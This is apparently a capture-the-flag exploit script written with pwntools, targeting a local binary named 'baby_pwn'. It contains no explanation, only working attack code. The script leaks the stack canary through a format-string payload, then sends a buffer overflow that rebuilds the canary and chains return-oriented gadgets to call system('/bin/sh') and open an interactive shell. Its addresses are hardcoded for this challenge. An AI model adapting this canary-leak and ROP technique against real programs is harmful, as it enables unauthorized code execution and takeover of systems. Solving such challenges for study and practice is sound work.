from pwn import *
p = process('./baby_pwn')
ret = 0x000400611
pop_rdi_ret = 0x400a83
bin_sh = 0x0400AC9
sys_addr = 0x0400650
payload1 = "%33$p"
p.sendlineafter('So plz leave your message:\n',payload1)
canary=int(p.recvuntil('\n',drop='true'),16)
payload2 = 'a'*0xc8+p64(canary)+'a'*8+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)
p.sendlineafter('Now ,plz give me your shellcode:\n',payload2)
p.interactive()

